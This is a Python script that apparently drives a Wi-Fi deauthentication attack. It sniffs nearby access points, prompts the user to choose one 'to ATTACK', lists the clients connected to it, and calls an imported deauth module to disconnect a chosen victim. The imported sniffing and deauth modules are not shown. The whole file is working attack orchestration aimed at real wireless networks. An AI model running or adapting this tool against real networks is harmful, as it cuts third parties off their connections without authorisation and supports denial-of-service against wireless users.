import sniff_ap as sniffAP
import sniff_clients as sniffCL
import deauth as deConnect



if __name__ == '__main__':
    
    # Sniffing Access Points..
    sniffAP.start()
    print("    \n\n\n    ")
    for i in range(len(sniffAP.AP_LIST)):
        print("index [{0}] -> {1}".format(i, sniffAP.AP_LIST[i]))
    
    # Choosing 1 of the AP as A Victim
    index = int(input("Choose an Access Point to ATTACK -   "))
    
    mac_ap = sniffAP.AP_LIST[index][sniffAP.BSSID]
    channel = sniffAP.AP_LIST[index][sniffAP.CHANNEL]
    
    
    # Sniffing Clients connecting to the Chosen AP
    sniffCL.start(mac_ap, channel)
    
    for i in range(len(sniffCL.CL_LIST)):
        print("index [{0}] -> {1}".format(i, sniffCL.CL_LIST[i]))
    
    # Choosing 1 of the Clients as A Victim
    index = int(input("Choose an Client to ATTACK -   "))
    
    client_mac = sniffCL.CL_LIST[index]

    # Disconnect the client from the AP 
    deConnect.start(client_mac,mac_ap)